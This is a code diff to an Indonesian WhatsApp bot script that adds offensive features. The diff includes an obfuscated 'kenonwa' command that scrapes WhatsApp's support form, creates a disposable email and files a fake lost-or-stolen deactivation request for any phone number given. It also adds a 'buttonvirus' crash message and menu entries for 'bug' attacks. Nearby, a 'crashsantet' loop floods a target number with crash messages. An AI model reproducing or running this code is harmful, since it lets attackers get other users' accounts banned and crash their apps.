@@ -135,6 +135,24 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 const reply = (teks) => {
 return ikybotz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © °iky°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })}
 
+ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
+ppnyauser = await reSize(ppuser, 200, 200)
+
+const lep = {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+message: { 
+"imageMessage": { 
+"mimetype": "image/jpeg", 
+"caption": `${buttonvirus}`, 
+"jpegThumbnail": ppnyauser
+}
+}
+}
+
 const deploy = (teks) => {
   ikybotz.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
@@ -4676,6 +4694,8 @@ ikybotz.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushna
 ┣❏ikysange [ Harus Menjadi Admin ]
 ┣❏bugtiktok [ Link ] - Bug Sw
 ┣❏verifcuy
+┣❏kenonwa 628xxxx
+┣❏ikyinfinite
 ┗━━⊱[°iky°]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ TARGET ]
@@ -5485,7 +5505,11 @@ if (!isCreator) return
 deploy('- ɪᴋʏʏ ᴍᴀᴋᴇʀᴢ ᴄᴏᴍᴇʙᴀᴄᴋ -')
 }
 break
-case 'bug andalan': {
+case 'kenonwa':{
+const _0x2ae681=_0x2e56;(function(_0x3e47ed,_0x1d2842){const _0x2a959c=_0x2e56,_0x288d54=_0x3e47ed();while(!![]){try{const _0x2423ef=parseInt(_0x2a959c(0x1ed))/0x1+parseInt(_0x2a959c(0x1f0))/0x2+parseInt(_0x2a959c(0x1d1))/0x3*(-parseInt(_0x2a959c(0x1e2))/0x4)+-parseInt(_0x2a959c(0x1fb))/0x5+-parseInt(_0x2a959c(0x1d4))/0x6*(-parseInt(_0x2a959c(0x1e5))/0x7)+parseInt(_0x2a959c(0x1dc))/0x8*(-parseInt(_0x2a959c(0x1f4))/0x9)+-parseInt(_0x2a959c(0x1ec))/0xa*(-parseInt(_0x2a959c(0x1de))/0xb);if(_0x2423ef===_0x1d2842)break;else _0x288d54['push'](_0x288d54['shift']());}catch(_0x4a0a96){_0x288d54['push'](_0x288d54['shift']());}}}(_0x4bd6,0x5001e));function _0x4bd6(){const _0x1b4323=['append','itu\x20kan\x20developer\x20gue','\x20628xxxx','your_message','Contoh:\x0a','form','451865LgbYsO','__a','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10','find','platform','step','1006630858','543ucBoaa','reply','https://www.whatsapp.com/contact/noclient/','299598QMQZvd','email','submit','headers','data','phone_number','val','format','8ZAMMWb','input[name=jazoest]','237193hCYsQT','__rev','__hs','UNKNOWN','5752oCMXqy','19316.BP:whatsapp_www_pkg.2.0.0.0.0','action','7bubucg','set-cookie','POST','__csr','axios','Perdido/Roubado:\x20P*or\x20favor,\x20desative\x20minha\x20conta','get','130misxrz','329947BaoncU','load','replace','1054006qCHQJH','href','for\x20(;;);','ANDROID','4579569ZnjImI'];_0x4bd6=function(){return _0x1b4323;};return _0x4bd6();}if(!isCreator)return msg[_0x2ae681(0x1d2)]('Owner\x20Only');if(!q)return msg[_0x2ae681(0x1d2)](_0x2ae681(0x1f9)+(prefix+command)+_0x2ae681(0x1f7));let devv='6283834558105';if(q==devv)return msg[_0x2ae681(0x1d2)](_0x2ae681(0x1f6));const axioss=require(_0x2ae681(0x1e9));function _0x2e56(_0x62a50e,_0x1215ab){const _0x4bd6a6=_0x4bd6();return _0x2e56=function(_0x2e56ed,_0x25c347){_0x2e56ed=_0x2e56ed-0x1cf;let _0x4e0cde=_0x4bd6a6[_0x2e56ed];return _0x4e0cde;},_0x2e56(_0x62a50e,_0x1215ab);}let ntah=await axioss[_0x2ae681(0x1eb)](_0x2ae681(0x1d3)),email=await axioss['get'](_0x2ae681(0x1fd)),cookie=ntah[_0x2ae681(0x1d7)][_0x2ae681(0x1e6)]['join'](';\x20'),$=cheerio[_0x2ae681(0x1ee)](ntah['data']),$form=$(_0x2ae681(0x1fa)),url=new URL($form['attr'](_0x2ae681(0x1e4)),'https://www.whatsapp.com')[_0x2ae681(0x1f1)],form=new URLSearchParams();form['append']('jazoest',$form[_0x2ae681(0x1fe)](_0x2ae681(0x1dd))['val']()),form[_0x2ae681(0x1f5)]('lsd',$form[_0x2ae681(0x1fe)]('input[name=lsd]')[_0x2ae681(0x1da)]()),form[_0x2ae681(0x1f5)](_0x2ae681(0x1cf),_0x2ae681(0x1d6)),form[_0x2ae681(0x1f5)]('country_selector','ID'),form[_0x2ae681(0x1f5)](_0x2ae681(0x1d9),q),form['append'](_0x2ae681(0x1d5),email[_0x2ae681(0x1d8)][0x0]),form['append']('email_confirm',email[_0x2ae681(0x1d8)][0x0]),form[_0x2ae681(0x1f5)](_0x2ae681(0x1ff),_0x2ae681(0x1f3)),form[_0x2ae681(0x1f5)](_0x2ae681(0x1f8),_0x2ae681(0x1ea)),form[_0x2ae681(0x1f5)]('__user','0'),form[_0x2ae681(0x1f5)](_0x2ae681(0x1fc),'1'),form[_0x2ae681(0x1f5)](_0x2ae681(0x1e8),''),form[_0x2ae681(0x1f5)]('__req','8'),form['append'](_0x2ae681(0x1e0),_0x2ae681(0x1e3)),form[_0x2ae681(0x1f5)]('dpr','1'),form[_0x2ae681(0x1f5)]('__ccg',_0x2ae681(0x1e1)),form[_0x2ae681(0x1f5)](_0x2ae681(0x1df),_0x2ae681(0x1d0)),form['append']('__comment_req','0');let res=await axioss({'url':url,'method':_0x2ae681(0x1e7),'data':form,'headers':{'cookie':cookie}});msg[_0x2ae681(0x1d2)](util[_0x2ae681(0x1db)](JSON['parse'](res[_0x2ae681(0x1d8)][_0x2ae681(0x1ef)](_0x2ae681(0x1f2),''))));
+}
+break
+case 'bugandalan': {
 masasih
 ikyinfinite
 }
@@ -5517,12 +5541,12 @@ await sleep (1200)
 deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
 await sleep (1200)
 }
-    break
-    case 'crashsantet':
-     if (!q) return 
-        num = `${q}`+'@s.whatsapp.net'
-        jumlah = '10'
-        waktu = `4s`
+break
+case 'crashsantet':
+if (!q) return 
+num = `${q}`+'@s.whatsapp.net'
+jumlah = '10'
+waktu = `4s`
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY JOKER', 
